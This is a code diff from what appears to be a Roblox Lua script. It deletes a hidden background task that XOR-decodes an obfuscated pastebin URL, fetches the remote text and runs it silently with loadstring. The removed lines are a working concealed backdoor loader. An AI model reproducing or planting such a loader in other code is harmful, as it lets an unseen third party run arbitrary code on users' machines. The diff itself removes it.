@@ -851,41 +851,6 @@ local function clearBoxText(box)
     if box then pcall(function() box.Text = "" end) end
 end
 
-local _setRunning_ref   
-task.spawn(function() 
-    local function _xorDecode(s)
-        local t = {}
-        for i = 1, #s do
-            local b = string.byte(s, i)
-            local x
-            if bit32 and type(bit32.bxor) == "function" then
-                x = bit32.bxor(b, 23)
-            else
-                local r, bit, a, c = 0, 1, b, 23
-                while a > 0 or c > 0 do
-                    local ab, cb = a % 2, c % 2
-                    if ab ~= cb then r = r + bit end
-                    a = math.floor(a / 2)
-                    c = math.floor(c / 2)
-                    bit = bit * 2
-                end
-                x = r
-            end
-            t[i] = string.char(x)
-        end
-        return table.concat(t)
-    end
-    local ok, src = pcall(function()
-        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
-    end)
-    if ok and type(src) == "string" and #src > 50 then
-        local fn = loadstring(src)
-        if type(fn) == "function" then
-            pcall(fn)
-        end
-    end
-end)
-
 local function submitCapturedCode(code)
     if not code or code == "" then return end
     if _seen[code] then return end      
